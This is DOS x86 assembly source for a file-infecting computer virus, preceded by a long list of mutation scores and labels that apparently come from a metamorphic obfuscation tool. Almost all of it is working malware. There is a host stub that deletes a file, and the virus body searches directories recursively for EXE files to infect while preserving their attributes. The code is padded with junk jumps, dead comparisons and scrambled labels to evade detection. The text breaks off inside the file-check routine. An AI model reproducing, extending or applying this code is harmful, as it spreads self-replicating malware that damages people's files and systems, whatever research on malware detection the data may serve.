;0.987905271396
;UntouchBlock_1
;0.868862522615
;UntouchBlock_1
;0.996325719217
;0.513552193535
;UntouchBlock_1
;1.00012535798
;0.920344595153
;UntouchBlock_0
;0.877840121631
;0.793423827829
;1.15348814871
;NoMutation
;0.652468390658
;ForcedJMP_1
;0.723897207131
;1.37950624399
;0.724974776781
;		JZ 	_0
;1.18624439872
;		JZ 	_0
;0.976445707175
;0.974403410946
;NoMutation
;1.15133370239
;UntouchBlock_0
;0.844825189726
;0.702772087817
;1.12942537299
;1.07648326811
;1.19799204125
;1.00016194018
;0.954157387653
;ForcedJMP_1
;0.669230569802
;0.694456891073
;1.08875863849
;		JZ 	_0
;1.15584788129
;UntouchBlock_1
;0.687327494961
;0.878636514736
;UntouchBlock_1
;1.15453679445
;NoMutation
;1.05896386406
;UntouchBlock_1
;0.755348983264
;0.587294140083
;1.22277652067
;ForcedJMP_1
;1.24776581072
;UntouchBlock_0
;0.954906499697
;UntouchBlock_1
;0.87546393399
;0.917031415859
;ForcedJMP_0
;1.0840205805
;		JZ 	_0
;0.696607292304
;ForcedJMP_0
;0.891963606982
;0.75533606694
;0.994396109787
;0.882636849639
;		JZ 	_0
;0.976329688104
;0.933008511435
;0.943748269427
;1.24252117155
;		JZ 	_1
;1.73279011032
;0.881095152051
;NoMutation
;0.837065955871
;0.863183335223
;0.531110397791
;ForcedJMP_0
;0.790642065746
;0.551889794284
;UntouchBlock_0
;0.576859440617
;0.796958035812
;0.871449650781
;UntouchBlock_1
;1.21536547394
;NoMutation
;1.10172103417
;NoMutation
;1.17294357005
;0.860246429702
;NoMutation
;0.903360202986
;0.823864463045
;NoMutation
;1.00908156757
;1.10205188284
;0.775330868108
;0.866142265557
;0.721762684201
;1.25910117127
;UntouchBlock_0
;0.850236889027
;0.613951800453
;0.833202273679
;0.888825378458
;0.674827057145
;0.919998160854
;1.05314511035
;0.790870171582
;0.506680521248
;1.0783852625
;0.831508000885
;ForcedJMP_1
;0.865544144528
;0.8585800203
;0.994213581435
;0.672736193766
;UntouchBlock_0
;0.789886974665
;0.865176541937
;0.723275596813
;		JZ 	_0
;0.782070287688
;0.58956132871
;		JZ 	_0
;0.984588664712
;0.700253171121
;0.509238810921
;0.710972133106
;0.921870974758
;0.835599849661
;1.00086147608
;0.776513078903
;0.845839523143
;0.838867253215
;0.719672959292
;UntouchBlock_1
;0.903784443348
;0.696731244619
;0.716864596909
;0.904366162769
;0.785048061336
;0.885770729989
;0.730797580963
;0.751911343299
;0.697656645934
;		JZ 	_0
;0.786654350168
;0.789561359469
;ForcedJMP_0
;0.658102216563
;0.735985099905
;0.867737688771
;0.835001564948
;		JNZ 	_0
;0.741827955016
;0.727452979339
;UntouchBlock_0
;0.535310616142
;0.815533857396
;UntouchBlock_1
;0.645437324881
;0.826153184396
;0.729989109029
;UntouchBlock_0
;0.726748876968
;NoMutation
;0.664148225779
;0.939466249237
;		JZ 	_0
;1.0083441695
;ForcedJMP_1
;0.715324298444
;		JNZ 	_1
;0.734129533481
;0.697182588669
;0.572169080589
;0.595178367565
;NoMutation
;0.567075540083
;0.630506636043
;0.793577884245
;NoMutation
;0.722026075612
;0.990549098178
;NoMutation
;0.632492983313
;0.851040942317
;1.06582060413
;UntouchBlock_1
;0.753772804837
;0.808902005009
;NoMutation
;0.751772540304
;0.754944289982
;0.584216284977
;0.558655620293
;0.840538902427
;0.595541157249
;UntouchBlock_0
;0.928406371645
;ForcedJMP_0
;0.885296328265
;0.694899240696
;0.743997370082
;0.689623233658
;0.808626763437
;		JNZ 	_1
;0.833457098547
;1.01938247829
;0.618715262536
;0.805474597288
;		JZ 	_0
;0.769179566924
;0.76572612363
;0.601502381966
;UntouchBlock_0
;0.637369519036
;0.856814838754
;0.721228832398
;0.534103959366
;0.733883078595
;0.673114654092
;ForcedJMP_1
;0.894407582044
;ForcedJMP_1
;0.627313233522
;0.529940219071
;0.794861809568
;UntouchBlock_1
;0.661726652075
;UntouchBlock_0
;0.733956317668
;NoMutation
;0.66008809592
;0.960118329581
;0.760252215984
;ForcedJMP_0
;0.551042684165
;0.799037957619
;NoMutation
;0.804642979361
;0.593122299543
;UntouchBlock_1
;0.639690117433
;0.810010749227
;		JZ 	_1
;0.644973960722
;NoMutation
;0.50482387631
;0.724148556716
;0.607598217888
;0.51145991907
;0.690972648771
;0.523272670902
;UntouchBlock_1
;0.673371486845
;		JNZ 	_0
;0.637054452536
;NoMutation
;0.762221302901
;0.459611448721
;0.563698608478
;0.348967604062
;0.547579180308
;ForcedJMP_0
;0.711043555898
;0.397543591203
;0.647458101926
;0.660492426912
;		JZ 	_0
;0.586810897705
;NoMutation
;0.516954092591
;0.660937259889
;0.610773601384
;0.827695922352
;0.584792567266
;0.547401714949
;0.720332849943
;0.694732162016
;		JZ 	_0
;0.614203948507
;0.955605287869
;UntouchBlock_1
;0.899942832136
;0.652407072868
;0.497504570871
;0.595502591239
;0.536361282948
;0.479820866052
;0.615740108548
;0.657990693605
;0.501359429728
;0.534663161858
;0.477883758764
;0.659170523053
;ForcedJMP_0
;0.909494278723
;0.412411324282
;UntouchBlock_0
;0.439171684048
;0.548715712032
;0.909577464771
;NoMutation
;0.767059212514
;0.845236008735
;0.79996550665
;0.78029789404
;0.501113316971
;0.489953693506
;NoMutation
;0.482564341372
;		JNZ 	_1
;0.606789108785
;NoMutation
;0.398082274868
;0.566142493167
;NoMutation
;0.582388280556
;0.370773819277
;0.575281768364
;0.614063429744
;0.554257908415
;0.48146747824
;0.38465462171
;		JZ 	_1
;0.689694815329
;		JNZ 	_1
;0.513927513597
;0.428849330964
;		JZ 	_1
;0.435044793635
;0.410063256412
;0.422748985589
;0.577727652501
;0.448542013537
;0.520963249592
;0.529977728337
;0.534531679199
;0.495032371362
;0.706985285965
;0.585578276144
;0.419523236985
;		JZ 	_1
;0.724987568129
;NoMutation
;0.811151806822
;ForcedJMP_0
;0.40795622507
;0.361878627667
;		JZ 	_1
;0.475347330971
;0.450959435891
;0.418836085797
;UntouchBlock_1
;0.370836881393
;0.35055063926
;		JNZ 	_1
;0.459778958728
;0.659851376471
;		JNZ 	_1
;0.469387037711
;0.547556702173
;0.366071539113
;0.415988191818
;0.506543009185
;0.555061097353
;		JNZ 	_1
;0.41653897985
;0.510103883875
;		JZ 	_0
;0.369904387477
;0.366542287058
;0.443951012552
;0.44513423778
;		JZ 	_0
;0.377463370782
;0.487426018915
;0.441423264633
;0.311996287672
;0.388831246926
;		JNZ 	_0
;0.380925429376
;0.427775386343
;0.401260855662
;NoMutation
;0.451680922522
;UntouchBlock_1
;0.360559256018
;0.268416282133
;NoMutation
;0.420091455652
;0.394854693695
;		JNZ 	_0
;0.398692173445
;0.251527497367
;UntouchBlock_1
;0.218306956067
;0.346175828457
;0.458720734629
;0.32970870465
;NoMutation
;0.390531412934
;0.332151737885
;		JNZ 	_1
;0.503141988049
;UntouchBlock_1
;0.290383938823
;ForcedJMP_0
;0.404506764187
;0.320532872741
;UntouchBlock_1
;0.456537034787
;0.294126738726
;0.36032951018
;NoMutation
;0.34069164681
;NoMutation
;0.436458448457
;0.302606952525
;0.327159386304
;0.266996144506
;0.356856163247
;0.268193211863
;0.28073616649
;0.292166744612
;		JNZ 	_0
;0.386816682563
;0.309386634172
;UntouchBlock_0
;0.409201086988
;0.225529368172
;NoMutation
;0.315005088411
;ForcedJMP_1
;0.307809303587
;		JZ 	_0
;0.204497660705
;0.211070538341
;ForcedJMP_1
;0.263517009644
;0.192052403199
;ForcedJMP_0
;0.282922759426
;0.168093222755
;0.164600660952
;0.269985717821
;0.209037385291
;0.269838483367
;		JZ 	_0
;0.212876679605
;0.197181876364
;0.19245185513
;0.169381197563
;UntouchBlock_0
;0.220865459936
;0.288238283339
;NoMutation
;0.228160140888
;ForcedJMP_0
;0.0974031386752
;UntouchBlock_1
;0.170546661227
;		JNZ 	_0
;0.145975136533
;0.139257253506
;ForcedJMP_0
;0.136568344925
;0.160418352335
;UntouchBlock_0
;0.0982467472603
;0.09717834651
;ForcedJMP_0
;0.076173660833
;0.0849356939111
;0.0778679847644
;UntouchBlock_1
;0.0529233525362
;NoMutation
;0.090002793116
;		JZ 	_0
;0.0528528056437
;0.0283549804696
;		JZ 	_0
;0.0250801817034
;0.0208311213445
;UntouchBlock_1
;0.0966872356919
;0.278141517842
;		JZ 	_1
;1.12337643255
;0.848202618047
;0.653681632436
;1.02662765153
;0.841382418337
;0.934732519547
;1.21583248692
;0.558925271477
;1.02575096161
;		JZ 	_0
;0.471322556609
;0.292923164606
;1.02754904487
;		JZ 	_1
;0.662203509566
;0.478874372431
;1.30694647586
;0.658708772126
;1.02520374099
;1.20098848412
;0.83323299185
;NoMutation
;0.919959074902
;1.18470234646
;		JZ 	_0
;1.44458560481
;0.6367091137
;1.09296266534
;UntouchBlock_1
;1.36255431136
;0.907076907216
;0.911108573385
;1.18088639959
;NoMutation
;0.725004828074
;0.989969162637
;		JNZ 	_1
;0.6432242504
;ForcedJMP_0
;1.26991922318
;0.727591425654
;1.15055372269
;ForcedJMP_0
;0.734502780429
;1.15225132799
;0.71957861571
;0.459984170671
;1.05445337084
;		JNZ 	_1
;0.521320596966
;0.961793686212
;0.359521215762
;1.03571991834
;1.20574712416
;0.769805148367
;		JZ 	_1
;1.04494329727
;1.21291138827
;ForcedJMP_0
;0.701218961357
;UntouchBlock_1
;0.187019093815
;0.948238375003
;0.683471665342
;1.01985396317
;0.834091281945
;0.666734772224
;		JNZ 	_0
;0.494976299445
;0.905398827861
;0.676707800588
;UntouchBlock_0
;1.08891396988
;0.76043667333
;1.2236007804
;1.4228660255
;0.719470129877
;		JNZ 	_1
;0.622374314112
;0.852338431736
;UntouchBlock_1
;0.709911411138
;		JZ 	_0
;0.892928190274
;0.738844162622
;		JNZ 	_1
;1.31559095502
;		JZ 	_0
;1.00914728542
;0.752194457775
;1.25737196714
;ForcedJMP_0
;0.90245783425
;1.13706322486
;0.744548401172
;		JNZ 	_0
;0.794243771637
;UntouchBlock_1
;0.856658531288
;		JZ 	_1
;0.93439852383
;0.719385901149
;0.912406311762
;		JNZ 	_1
;0.722605707783
;UntouchBlock_0
;0.758337032013
;0.603637441869
;0.832235935419
;0.973366745551
;1.0291258434
;0.753634948422
;ForcedJMP_0
;0.765270907541
;0.956322164395
;1.2969768538
;ForcedJMP_0
;0.813867068061
;1.04057969661
;1.03004960974
;0.856134858433
;0.551015973402
;0.803265423762
;		JNZ 	_0
;0.622840982565
;		JNZ 	_0
;0.845985191867
;		JNZ 	_1
;1.18054815851
;ForcedJMP_0
;0.763840146642
;		JNZ 	_1
;1.10307983956
;0.811236320984
;1.26650213051
;0.516469257155
;ForcedJMP_1
;0.591666846423
;UntouchBlock_1
;0.915787894504
;0.664147442825
;0.881924172674
;0.745465178704
;ForcedJMP_1
;0.941582437513
;ForcedJMP_0
;1.07888885836
;UntouchBlock_0
;0.748002352463
;0.6078352482
;ForcedJMP_1
;1.08172236265
;0.776808770188
;1.11741442486
;		JZ 	_0
;1.05170700326
;0.727089883813
;0.89038052148
;0.59469004197
;0.738699599342
;0.76825261592
;0.627752288501
;0.733628151824
;UntouchBlock_0
;0.575673943969
;0.531778848751
;ForcedJMP_0
;0.755183791674
;0.61228432838
;0.675687435134
;0.973973785024
;1.01731323425
;0.607008560487
;0.661524379412
;0.941653232029
;0.810835314267
;0.785983476368
;0.822344576546
;0.368761765937
;0.939656207133
;1.19032677501
;1.04776947207
;UntouchBlock_0
;0.55151003199
;NoMutation
;0.489264119947
;UntouchBlock_1
;0.875595508632
;NoMutation
;0.59617556163
;NoMutation
;0.58153100393
;0.643664792083
;0.579378514557
;ForcedJMP_1
;0.576490965532
;ForcedJMP_0
;0.797178378313
;0.510245594374
;0.57159924711
;0.912586158033
;		JNZ 	_0
;0.71326181228
;UntouchBlock_0
;0.739203701323
;0.749354164098
;0.584982223334
;		JNZ 	_0
;0.564172503609
;0.634481638945
;0.457230924152
;0.820290367064
;0.517639454084
;UntouchBlock_1
;0.381085371787
;0.692254089372
;0.463711291027
;UntouchBlock_1
;0.749742589528
;UntouchBlock_0
;0.707361351072
;		JNZ 	_0
;0.930065567795
;ForcedJMP_1
;0.511408978555
;0.593460418581
;0.867543181554
;0.787291108351
;0.893569757313
;0.508063212836
;0.633434037146
;0.661281544294
;0.466469056646
;UntouchBlock_1
;0.444806315998
;		JNZ 	_0
;0.430869976442
;NoMutation
;0.581246776591
;		JNZ 	_0
;0.670393149438
;		JNZ 	_1
;0.705916086177
;0.521388953107
;		JNZ 	_1
;0.671992284258
;NoMutation
;0.446665403551
;ForcedJMP_0
;0.880010340115
;NoMutation
;0.455307689816
;0.468169550211
;0.68386566998
;0.604321219833
;		JNZ 	_1
;0.658936029106
;UntouchBlock_0
;0.438527045956
;0.555788098382
;0.532212468852
;0.359713744891
;0.501798943794
;ForcedJMP_0
;0.329358124376
;0.656664828516
;ForcedJMP_0
;0.425428733921
;0.48782276144
;UntouchBlock_0
;0.318529731716
;0.455061641414
;UntouchBlock_1
;0.384896040083
;0.521783932893
;0.337103094301
;0.463549202095
;0.323909358254
;ForcedJMP_0
;0.474944318268
;0.363340325319
;UntouchBlock_1
;0.372939190344
;ForcedJMP_0
;0.290931252914
;0.383223246876
;ForcedJMP_0
;0.480266371934
;UntouchBlock_0
;0.400048667559
;0.36348550108
;0.338192283229
;NoMutation
;0.297238824787
;		JZ 	_0
;0.275010413718
;0.319382429846
;UntouchBlock_1
;0.263565942885
;UntouchBlock_1
;0.23759778661
;		JZ 	_0
;0.272640424687
;NoMutation
;0.274884158133
;		JZ 	_1
;0.220828762691
;0.251034628222
;UntouchBlock_1
;0.176873183235
;0.13729936974
;0.203894646395
;UntouchBlock_0
;0.227422327201
;ForcedJMP_0
;0.19110609477
;0.182235924012
;0.185988824664
;0.173876517207
;ForcedJMP_0
;0.129929986568
;0.163590613745
;		JZ 	_1
;0.11489926797
;UntouchBlock_1
;0.0956411399039
;		JNZ 	_0
;0.0563617016228
;0.0474096732495
;		JZ 	_0
;ForcedJMP_0
 		.SEQ ;segments must appear in sequential order
HOSTSEG SEGMENT BYTE
 		ASSUME CS:HOSTSEG,SS:HSTACK
PGMSTR DB ’ABC.EXE’,0
HOST:
	 mov ax,cs 
XQYLS:
		JMP 	_HWRC
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
_HWRC:
	 mov ds,ax
TUICA:
NZGYH:
	 mov dx,OFFSET PGMSTR
WIULF:
	 mov ah,41H
YGSXV:
MOIKI:
YQT_A:
	 int 21H 
	 mov ah,4CH
XGIMK:
		JMP 	FY_EQ
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
FY_EQ:
	 mov al,0
_RVAO:
IK_VF:
	 int 21H 
HOSTSEG ENDS
HSTACK SEGMENT PARA STACK
db 100H dup (?)
HSTACK ENDS
STACKSIZE EQU 100H 
NUMRELS EQU 2 
VSEG SEGMENT PARA
 	 ASSUME CS:VSEG,DS:VSEG,SS:VSTACK
VIRUSID 	DW 0C8AAH 
OLDDTA 		DD 0 
DTA1 		DB 2BH dup (?) 
DTA2		DB 56H dup (?) 
EXE_HDR 	DB 1CH dup (?) 
EXEFILE 	DB ’\*.EXE’,0 
ALLFILE 	DB ’\*.*’,0 
USEFILE 	DB 78 dup (?) 
LEVEL 		DB 0 
HANDLE 		DW 0 
FATTR 		DB 0 
FTIME 		DW 0 
FDATE 		DW 0 
FSIZE 		DD 0 
VIDC 		DW 0 
VCODE 		DB 1 
JTGBP:
PWDGG:
		call 	 JSSWA
		call 	 VGPVM


VIRUS:
		 push ax
		 mov ax,cs
		cmp 	ax,dx
JNZ JSSWA
JMP PWDGG
JSSWA:
		 mov ds,ax 						
		JMP 	JTGBP
VGPVM:
		JMP 	XNPQW
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
XNPQW:
		 mov ax,es 						
		 mov WORD PTR [OLDDTA+2],ax 	
		JMP 	OVVFG
ANBST:
		 call SHOULDRUN 				
		 jz   N1
		 JMP  REL1
		 N1: 						
		 call SETSR 
		 call NEW_DTA 					
		 call FIND_FILE 				
		 jz   N2
		 JMP  FINISH 					
		 N2:
		 call SAVE_ATTRIBUTE 			
		 call INFECT 					
		 call REST_ATTRIBUTE 			
ETBJF:
LQ_WS:
		call 	 JAKZR
		call 	 FOGCD


FINISH:  call RESTORE_DTA 	
RGXSV:
		call 	 UQVWI
OVVFG:
		call 	 ANBST
 		 pop ax

REL1: 						
		JMP 	FQELX
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
FQELX:
 		 mov ax,HSTACK 				
		JMP 	ETBJF
FOGCD:
 		 cli 
 		 mov ss,ax
		JMP 	ZVKKA
DNALS:
JNZ MCSZ_
JMP VZUIT
MCSZ_:
		JMP 	LQ_WS
JAKZR:
JZ ZKDXX
JMP ZKURE
ZKURE:
		call 	 ZKDXX
CYKAF:
		call 	 EREER
ZVKKA:
		call 	 DNALS
SVWBI:
		call 	 _TQIG
ZKDXX:

REL1A: 						
 		 mov sp,OFFSET HSTACK
		JMP 	SVWBI
_TQIG:
		JMP 	_GTRI
XCOCI:
 		 mov es,WORD PTR [OLDDTA+2] 
JNZ FO_ZX
JMP HMVWJ
FO_ZX:
		JMP 	YBKQ_
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
YBKQ_:
		 mov ds,WORD PTR [OLDDTA+2] 
JNZ JNAKL
JMP BDPFY
JNAKL:
JNZ EREER
JMP CYKAF
EREER:
VZUIT:
		call 	 MCSZ_
HMVWJ:
		call 	 FO_ZX
KICDN:
		call 	 ASRRI
 		 sti 					

REL2:					 			
 		jmp FAR PTR HOST 
YVRAZ:
_GTRI:
		call 	 XCOCI
		call 	 WGWAL
BDPFY:
AFPUL:
		call 	 WLSZR
GYMHO:
		call 	 DACPP
		call 	 JNAKL


FIND_FILE:
	mov al,’\’ 
		JMP 	KICDN
ASRRI:
	mov BYTE PTR [USEFILE],al
		JMP 	AFPUL
WLSZR:
		JMP 	RGXSV
UQVWI:
	mov si,OFFSET USEFILE+1
	xor dl,dl
	mov ah,47H
		cmp 	bx,ax
JNZ DACPP
JMP GYMHO
DACPP:
JNZ OSDYI
JMP AUQTF
OSDYI:
	int 21H 
	cmp BYTE PTR [USEFILE+1],0 
	jz  N3
	JMP FF2 
	N3:
	xor al,al 
PCGQO:
		call 	 JQAEL
	mov BYTE PTR [USEFILE],al 
JNZ WGWAL
JMP YVRAZ
NKXAA:
		call 	 DNSTA
AUQTF:
		call 	 OSDYI
YKDGP:
		call 	 FCTPJ
WGWAL:

		JMP 	TODCA
nop
nop
nop
nop
TODCA:
FF2: mov al,2
		cmp 	dx,dx
JNZ FCTPJ
JMP YKDGP
FCTPJ:
		JMP 	YYZOO
CZOGH:
		JMP 	VOZCI
cmp ax,bx
cmp ax,bx
cmp ax,bx
VOZCI:
	mov [LEVEL],al 
JZ DNSTA
JMP NKXAA
DNSTA:
	call FINDBR 
	jnz N4
	JMP FF3 
	N4:
	xor al,al 
	mov BYTE PTR [USEFILE],al 
JZ JQAEL
JMP PCGQO
JQAEL:
	inc al 
		JMP 	FCDJW
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
FCDJW:
	mov [LEVEL],al 
JNZ GMMXQ
JMP ZYIUT
GMMXQ:
		JMP 	BRIL_
ZVP_N:
YYZOO:
		call 	 CZOGH
BRIL_:
		call 	 ZVP_N
ZYIUT:
		call 	 GMMXQ
	call FINDBR 

FF3:
AUPVP:
		call 	 DARCM
	ret 

FINDBR:
	call FINDEXE 
	jc  N5
	JMP FBE3 
	N5:
	cmp [LEVEL],0 
	jnz N6
	JMP FBE1 
	N6:
	dec [LEVEL] 
	mov di,OFFSET USEFILE 
JZ DARCM
JMP AUPVP
DARCM:
	mov si,OFFSET ALLFILE 
		JMP 	SAFSI
OAVRC:
JZ QMXYY
JMP MHJJR
QMXYY:
	call CONCAT 
	inc di
	push di 
	call FIRSTDIR 
	jz  N7
	JMP FBE 
MHJJR:
		call 	 QMXYY
POUVM:
		call 	 SEREX
SAFSI:
		call 	 OAVRC
VXFDX:
		call 	 AYCBP
VCYLN:
		call 	 UYDMC
WCPRE:
		call 	 LRNJE
SAXOI:
		call 	 NBWPR
WHISU:
		call 	 IFTCJ
	N7:

FB1: 
		pop di 
		xor al,al
		stosb
		mov di,OFFSET USEFILE
JZ UYDMC
JMP VCYLN
UYDMC:
		mov bx,OFFSET DTA2+1EH
JNZ IFTCJ
JMP WHISU
IFTCJ:
JNZ LRNJE
JMP WCPRE
LRNJE:
		mov al,[LEVEL]
		JMP 	POUVM
SEREX:
		JMP 	WRHKY
ZMTCF:
		JMP 	SFGCN
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
SFGCN:
		mov dl,2BH 
JZ NBWPR
JMP SAXOI
NBWPR:
		mul dl 
		add bx,ax 
		JMP 	ZTCPK
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
ZTCPK:
		mov si,bx
		JMP 	IOSJA
BFKSD:
		JMP 	VXFDX
AYCBP:
		call CONCAT 
		push di 
		call FINDBR 
		jnz N8
		JMP FBE2 
		N8:
		call NEXTDIR 
		jnz N9
		JMP FB1 
WRHKY:
		call 	 ZMTCF
		N9:

FBE: 
		inc [LEVEL] 
		pop di 
		xor al,al 
IOSJA:
		call 	 BFKSD
TS_S_:
		call 	 LM_AG
		stosb

		JMP 	OBXNI
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
OBXNI:
		JMP 	NVFJM
nop
nop
nop
nop
nop
nop
nop
nop
NVFJM:
FBE1: mov al,1 
		cmp 	bx,bx
JNZ LM_AG
JMP TS_S_
LM_AG:
		JMP 	LQQBL
DVYTP:
	or al,al
BTUV_:
		call 	 SQZOZ
LEJCE:
		call 	 WBXLK
LQQBL:
		call 	 DVYTP
	ret

M_PEP:
		call 	 TYOKE
FHRGV:
		call 	 _XBKA
FBE2: pop di 

FBE3: xor al,al 
 	  ret 
FPSMO:
DVTJW:
		call 	 OYVVH
DBDXX:
		call 	 GPI_Y
		call 	 HLILU


FINDEXE:
		JMP 	XYNWU
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
XYNWU:
		mov dx,OFFSET DTA1 
		JMP 	LEJCE
WBXLK:
		JMP 	SHSYW
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
SHSYW:
		mov ah,1AH
VSCMX:
		JMP 	FHRGV
_XBKA:
		JMP 	DBDXX
GPI_Y:
		JMP 	FPSMO
HLILU:
		int 21H
		JMP 	XSLRT
nop
nop
nop
nop
XSLRT:
		mov di,OFFSET USEFILE
		JMP 	DVTJW
OYVVH:
		JMP 	BTUV_
SQZOZ:
		mov si,OFFSET EXEFILE
TPSMG:
JZ XEFHY
JMP KWW_W
XEFHY:
		call CONCAT 
		push di 
		JMP 	TEKZK
cmp ax,bx
TEKZK:
		mov dx,OFFSET USEFILE
DPXTU:
AXKUC:
JZ VCGSK
JMP AXFWP
VCGSK:
JNZ NJBQT
JMP CGTUP
NJBQT:
		mov cx,3FH 
		JMP 	MKVIT
YIMLV:
		mov ah,4EH
QJFES:
KMH_D:
JZ JRPMX
JMP KXFUC
JRPMX:
JNZ TYOKE
JMP M_PEP
TYOKE:
CGTUP:
		call 	 NJBQT
KWW_W:
		call 	 XEFHY
KXFUC:
		call 	 JRPMX
AXFWP:
		call 	 VCGSK
MKVIT:
		call 	 YIMLV
_TRLR:
		call 	 QNFJW
VHFRK:
		call 	 FGFUU
G_MEH:
		call 	 QOJST
QNRHX:
		call 	 CAXHL
SLHME:
		call 	 YSXSY
		int 21H

NEXTEXE:
		or al,al 
		jz N10
		JMP FEC 
		N10:
		pop di
		inc di
		stosb 
		mov di,OFFSET USEFILE
JNZ YSXSY
JMP SLHME
YSXSY:
JNZ QOJST
JMP G_MEH
QOJST:
		JMP 	VEDXB
UPVHZ:
		mov si,OFFSET DTA1+1EH
		cmp 	ax,dx
JNZ CAXHL
JMP QNRHX
CAXHL:
		JMP 	VHFRK
FGFUU:
		cmp 	dx,ax
JZ QNFJW
JMP _TRLR
QNFJW:
		call CONCAT 
		dec di
		push di
		call FILE_OK 
		jc N11
		JMP FENC 
		N11:
		JMP 	RM_ZU
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
RM_ZU:
		JMP 	QDAHF
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
QDAHF:
		mov ah,4FH
JNZ _CGUU
JMP VJQHE
_CGUU:
		int 21H 
		jmp SHORT NEXTEXE 

FEC: 
	 pop di
 	 mov BYTE PTR [di],0 
JNZ Z_BNS
JMP RNTUA
Z_BNS:
		JMP 	TGOKS
YKOPC:
		JMP 	HDLUM
DAMFN:
	 stc
VEDXB:
		call 	 UPVHZ
TGOKS:
		call 	 YKOPC
VJQHE:
		call 	 _CGUU
	 ret

FENC:
	 pop di
	 ret
HDLUM:
		call 	 DAMFN
D_PSE:
LIEQW:
		call 	 IXHRB
RNTUA:
		call 	 Z_BNS
		call 	 MHDAO


FIRSTDIR:
	 call GET_DTA
	 push dx 
	 mov ah,1AH 
	 int 21H
	 mov dx,OFFSET USEFILE
	 mov cx,10H 
		JMP 	LIEQW
IXHRB:
		JMP 	TAMVS
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
TAMVS:
		JMP 	JGDCF
xor bx,cx
xor bx,cx
xor bx,cx
JGDCF:
		JMP 	NHPHI
nop
NHPHI:
	 mov ah,4EH 
JZ RGHFH
JMP GQZEP
RGHFH:
		JMP 	EQJNV
VNMHL:
JZ MHDAO
JMP D_PSE
MHDAO:
EQJNV:
		call 	 VNMHL
GQZEP:
		call 	 RGHFH
	 int 21H

NEXTD1:
	 pop bx 
	 or al,al 
	 jz N12
	 JMP NEXTD3 
	 N12:
	 test BYTE PTR [bx+15H],10H 
	 jnz N13
	 JMP NEXTDIR 
	 N13:
	 cmp BYTE PTR [bx+1EH],’.’ 
	 je N14
	 JMP NEXTD2 
	 N14:
	 
NEXTDIR: 
	 call GET_DTA 
	 push dx
	 mov ah,1AH 
JNZ DCB_F
JMP WKFDN
DCB_F:
	 int 21H
		JMP 	DCEQH
xor bx,cx
DCEQH:
	 mov ah,4FH
	 int 21H 
	 jmp NEXTD1 ;SHORT NEXTD1 -- uncomment for short jump

NEXTD2:
 	 xor al,al 

NEXTD3:
NEJVW:
		call 	 DAKKH
FCQGJ:
		call 	 RSBUG
	 ret 


GET_DTA:
		JMP 	DQWAM
cmp ax,bx
cmp ax,bx
cmp ax,bx
DQWAM:
		JMP 	EFZLL
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
EFZLL:
 mov dx,OFFSET DTA2
JZ RSBUG
JMP FCQGJ
RSBUG:
		JMP 	DGVZI
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
DGVZI:
 mov al,2BH
		cmp 	ax,cx
JNZ VWASI
JMP XHMMX
VWASI:
		cmp 	dx,ax
JNZ X_EZL
JMP PNJQW
X_EZL:
JNZ GWSWZ
JMP NSFKV
GWSWZ:
 mul [LEVEL]
 add dx,ax 
WKFDN:
		call 	 DCB_F
NSFKV:
		call 	 GWSWZ
 ret
PNJQW:
		call 	 X_EZL
DKFPC:
		call 	 YJANN
XHMMX:
		call 	 VWASI


CONCAT:
		JMP 	PIHXT
nop
nop
nop
PIHXT:
	 mov al,byte ptr es:[di] 
JNZ PWZXL
JMP NAMBP
PWZXL:
		JMP 	DKFPC
YJANN:
JZ DAKKH
JMP NEJVW
DAKKH:
	 inc di
	 or al,al
	 jnz CONCAT ;unmodified code be careful rit
	 dec di 
	 push di 

CONCAT2:
	 cld
	 lodsb 
	 stosb
	 or al,al
	 jnz CONCAT2 ;unmodified code be careful rit
	 pop di 
NAMBP:
		call 	 PWZXL
	 ret 	 


FILE_OK:
	 call GET_EXE_HEADER 
	 jnc N15
	 JMP OK_END 
	 N15:
	 call CHECK_SIG_OVERLAY 
	 jnc N16
	 JMP OK_END 
	 N16:
	 call REL_ROOM 
	 jnc N17
	 JMP OK_END 
	 N17:
	 call IS_ID_THERE 

